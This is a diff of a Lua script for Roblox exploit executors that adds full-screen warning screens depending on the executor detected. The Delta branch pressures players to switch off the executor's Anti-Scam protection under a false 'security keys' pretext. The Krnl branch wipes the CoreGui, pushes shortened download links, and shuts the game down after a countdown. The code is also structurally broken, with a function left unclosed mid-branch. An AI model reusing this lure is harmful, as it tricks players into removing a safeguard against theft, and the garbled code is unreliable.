@@ -1,97 +1,206 @@
-local success, err = pcall(function()
-
-    -- Executor adı bul
-
-    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
-
-    -- Sadece Delta için devreye girsin
-
-    if executorName ~= "Delta" then
-
-        return
-
+local function createWarningGUI(isDelta)
+    -- Clean up any existing GUIs
+    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name == "WarningGUI" then
+            v:Destroy()
+        end
     end
 
-    -- Tam ekran warning screen
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "WarningGUI"
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    
+    if syn and syn.protect_gui then
+        syn.protect_gui(gui)
+    end
+    gui.Parent = game:GetService("CoreGui")
 
-    local screenGui = Instance.new("ScreenGui")
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BorderSizePixel = 0
+    background.ZIndex = 100000
+    background.Parent = gui
 
-    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    if isDelta then
+        -- Delta warning message
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(0.9, 0, 0.9, 0)
+        label.Position = UDim2.new(0.05, 0, 0.05, 0)
+        label.Text = [[
+⚠️ IMPORTANT DELTA SETUP REQUIRED ⚠️
 
-    screenGui.Name = "WarningScreen"
+CRITICAL: You MUST disable Anti-Scam in Delta settings!
 
-    screenGui.ResetOnSpawn = false
+Without this, the script cannot work properly and will give errors.
 
-    screenGui.IgnoreGuiInset = true
+Steps to disable:
+1. Click the Delta icon in the top-left
+2. Go to Settings
+3. Find "Anti-Scam" option
+4. Turn it OFF completely
+5. Rejoin the game if already executed
 
-    local frame = Instance.new("Frame")
+This is required for security keys to work properly!
 
-    frame.Parent = screenGui
-
-    frame.Size = UDim2.new(1, 0, 1, 0)
-
-    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-
-    frame.BackgroundTransparency = 0
-
-    frame.BorderSizePixel = 0
-
-    local label = Instance.new("TextLabel")
-
-    label.Parent = frame
-
-    label.Size = UDim2.new(0.9, 0, 0.9, 0) 
-
-    label.Position = UDim2.new(0.05, 0, 0.05, 0) 
-
-    label.Text = [[
-
-⚠️ WARNING FOR DELTA USERS ⚠️
-
-If you see this message, make sure to turn off Anti-Scam before executing the script!  
-
-If you haven't turned it off, rejoin the game, disable Anti-Scam, and try again.  
-
-Otherwise, the script will not work!
-
-This screen will close after 20 seconds...
-
+This message will auto-close in 20 seconds...
 ]]
+        label.TextColor3 = Color3.fromRGB(255, 215, 0)
+        label.BackgroundTransparency = 1
+        label.TextSize = 24
+        label.Font = Enum.Font.GothamBold
+        label.TextWrapped = true
+        label.TextStrokeTransparency = 0.2
+        label.TextStrokeColor3 = Color3.fromRGB(255, 140, 0)
+        label.TextXAlignment = Enum.TextXAlignment.Center
+        label.TextYAlignment = Enum.TextYAlignment.Center
+        label.ZIndex = 100001
+        label.Parent = background
 
-    label.TextColor3 = Color3.fromRGB(255, 215, 0)
+        task.delay(20, function()
+            gui:Destroy()
+        end)
+    else
+        -- Krnl warning message
+        local container = Instance.new("Frame")
+        container.AnchorPoint = Vector2.new(0.5, 0.5)
+        container.Position = UDim2.new(0.5, 0, 0.45, 0)
+        container.Size = UDim2.new(0.8, 0, 0.5, 0)
+        container.BackgroundTransparency = 1
+        container.ZIndex = 100001
+        container.Parent = background
 
-    label.BackgroundTransparency = 1
-
-    label.TextSize = 24
-
-    label.Font = Enum.Font.GothamBold
-
-    label.TextWrapped = true
-
-    label.TextStrokeTransparency = 0.2
-
-    label.TextStrokeColor3 = Color3.fromRGB(255, 140, 0)
-
-    label.TextXAlignment = Enum.TextXAlignment.Center
-
-    label.TextYAlignment = Enum.TextYAlignment.Center
-
-    -- 20 saniye sonra kapat
-
-    task.delay(20, function()
-
-        if screenGui then
-
-            screenGui:Destroy()
-
+if identifyexecutor() == 'Krnl' then
+    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        pcall(function()
+            v:Destroy()
+        end)
+    end
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "WarningGUI"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    if syn and syn.protect_gui then
+        syn.protect_gui(gui)
+    end
+    gui.Parent = game:GetService("CoreGui")
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BorderSizePixel = 0
+    background.Parent = gui
+    local container = Instance.new("Frame")
+    container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.Position = UDim2.new(0.5, 0, 0.45, 0)
+    container.Size = UDim2.new(0.8, 0, 0.5, 0)
+    container.BackgroundTransparency = 1
+    container.Parent = background
+                    -- Данные для копирования
+    local executors = {
+        {name = "Delta", link = "https://link-center.net/1338243/delta-roblox-executor"},
+        {name = "Codex", link = "https://direct-link.net/1338243/codex-free-roblox-mobile"},
+    }
+    -- UIGridLayout для кнопок
+    local buttonsContainer = Instance.new("Frame")
+    buttonsContainer.Size = UDim2.new(1, 0, 0, #executors * 50)
+    buttonsContainer.BackgroundTransparency = 1
+    buttonsContainer.Parent = container
+    local grid = Instance.new("UIGridLayout")
+    grid.CellSize = UDim2.new(0.45, 0, 0, 40)
+    grid.CellPadding = UDim2.new(0.05, 0, 0, 10)
+    grid.FillDirectionMaxCells = 2
+    grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    grid.VerticalAlignment = Enum.VerticalAlignment.Top
+    grid.SortOrder = Enum.SortOrder.LayoutOrder
+    grid.Parent = buttonsContainer
+    -- Создание кнопок
+    for _, exec in ipairs(executors) do
+        local btn = Instance.new("TextButton")
+        btn.Text = "Copy " .. exec.name .. " Link"
+        btn.TextScaled = true
+        btn.Font = Enum.Font.SourceSansBold
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        btn.BorderSizePixel = 0
+        btn.AutoButtonColor = true
+        btn.Size = UDim2.new(0, 200, 0, 40)
+        btn.Parent = buttonsContainer
+    
+        btn.MouseButton1Click:Connect(function()
+            if setclipboard then
+                setclipboard(exec.link)
+            end
+            btn.Text = "Copied!"
+            task.delay(1.5, function()
+                btn.Text = "Copy " .. exec.name .. " Link"
+            end)
+        end)
+    end
+    local uiList = Instance.new("UIListLayout")
+    uiList.FillDirection = Enum.FillDirection.Vertical
+    uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    uiList.VerticalAlignment = Enum.VerticalAlignment.Center
+    uiList.SortOrder = Enum.SortOrder.LayoutOrder
+    uiList.Padding = UDim.new(0, 10)
+    uiList.Parent = container
+    local function createLabel(text, color)
+        local label = Instance.new("TextLabel")
+        label.BackgroundTransparency = 1
+        label.Size = UDim2.new(1, 0, 0, 40)
+        label.TextColor3 = color or Color3.new(1, 1, 1)
+        label.Text = text
+        label.Font = Enum.Font.SourceSansBold
+        label.TextScaled = true
+        label.TextWrapped = true
+        label.Parent = container
+        return label
+    end
+    local dangerEmoji = "⚠️"
+    createLabel(dangerEmoji .. " [KRNL Executor Detected] " .. dangerEmoji, Color3.fromRGB(255, 255, 0))
+    createLabel("WARNING!: KRNL Executor wont wont with this script", Color3.fromRGB(255, 0, 0))
+    createLabel("It is very detected and it will give errors!", Color3.new(1, 1, 1))
+    createLabel("Please use any of these executors:", Color3.new(1, 1, 1))
+    createLabel("(Delta, Codex)", Color3.fromRGB(0, 255, 255))
+    createLabel("Those are supported and legit exploits!", Color3.new(1, 1, 1))
+    local countdownLabel = Instance.new("TextLabel")
+    countdownLabel.AnchorPoint = Vector2.new(0.5, 1)
+    countdownLabel.Position = UDim2.new(0.5, 0, 1, -20)
+    countdownLabel.Size = UDim2.new(1, -40, 0, 40)
+    countdownLabel.BackgroundTransparency = 1
+    countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    countdownLabel.TextScaled = true
+    countdownLabel.Font = Enum.Font.SourceSansBold
+    countdownLabel.Text = "Game will be closed in 30 seconds. Please install other executor"
+    countdownLabel.Parent = background
+    local seconds = 30
+    spawn(function()
+        while seconds > 0 do
+            countdownLabel.Text = "Game will be closed in " .. seconds .. " second" .. (seconds == 1 and "" or "s") .. ". Please install other executor"
+            wait(1)
+            seconds -= 1
         end
-
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer
+        game:Shutdown()
     end)
+    wait(999999)
+    return
+end
 
+local success, err = pcall(function()
+    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+    
+    if executorName == "Delta" then
+        createWarningGUI(true)
+    elseif executorName == "Krnl" then
+        createWarningGUI(false)
+    end
 end)
 
 if not success then
-
     warn("Error: " .. err)
-
 end
